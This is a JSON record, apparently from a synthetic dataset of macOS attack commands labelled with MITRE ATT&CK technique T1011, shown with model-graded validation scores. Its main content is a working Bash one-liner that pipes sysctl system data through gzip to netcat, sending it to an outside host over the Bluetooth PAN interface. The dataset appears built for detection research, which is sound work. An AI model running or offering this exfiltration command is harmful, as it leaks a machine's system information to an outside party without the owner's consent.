@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sysctl -a | gzip -c | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.66 57114",
+  "explanation": "Exfiltrates compressed system info via Bluetooth PAN by binding the sender to that interface, fulfilling T1011 behavior.",
+  "rationale_steps": [
+    "Discover Bluetooth PAN IP using networksetup",
+    "Bind netcat to the Bluetooth PAN address",
+    "Transmit telemetry to an uncommon TCP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-89b1de0a",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses, valid pipelines, and BSD/macOS-compatible flags and command substitution are used correctly.",
+        "semantic_score": 4,
+        "semantic_justification": "It compresses sysctl output and sends it via nc bound to the Bluetooth PAN IP, which can force egress over that medium if the interface is active and routing permits, but success depends on interface availability and routing configuration.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:38:12.001320Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes and parentheses, valid pipe operators, proper command substitution using $(), and correct flag usage throughout all tools (sysctl -a, gzip -c, nc -s).",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly captures system info, compresses it, and uses nc's -s flag to bind to the Bluetooth PAN interface IP (extracted via networksetup and awk), which is a plausible macOS-specific method to exfiltrate over Bluetooth PAN matching T1011, though the -s flag binds the source address rather than strictly forcing routing over the Bluetooth interface, making it a minor realism gap if other routes exist.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:00:37.436122Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, correctly nested command substitutions, and standard flags for the macOS versions of netcat and networksetup.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively forces exfiltration over the Bluetooth PAN interface by binding netcat to its specific IP address, perfectly aligning with the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:00:38.206299Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
